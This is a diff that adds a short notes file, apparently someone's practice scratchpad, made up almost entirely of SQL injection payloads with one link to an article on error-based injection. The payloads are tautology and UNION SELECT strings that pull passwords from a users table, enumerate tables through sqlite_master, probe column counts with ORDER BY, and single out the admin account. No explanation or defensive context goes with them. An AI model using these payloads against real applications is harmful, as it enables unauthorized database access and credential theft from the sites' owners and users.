@@ -1,0 +1,17 @@
+' or 1=1 union select pass from users;--
+' or 1=1 union SELECT tbl_name FROM sqlite_master WHERE type = 'table';
+
+https://www.cybrary.it/0p3n/anatomy-of-error-based-sql-injection/
+' or 1=1 union select 1,2 ;--
+
+' or 1=1 union select 1,2 ;--
+' or 1=1 union select 1,2 order by 2,1;--
+
+union select 1,2 order by 2,1
+
+' or user='';--
+' or 1=1 union select 1,2 from users where user='admin';--
+' or 1=1 union select * from users where user='admin';--
+
+
+' union SELECT * from users;--
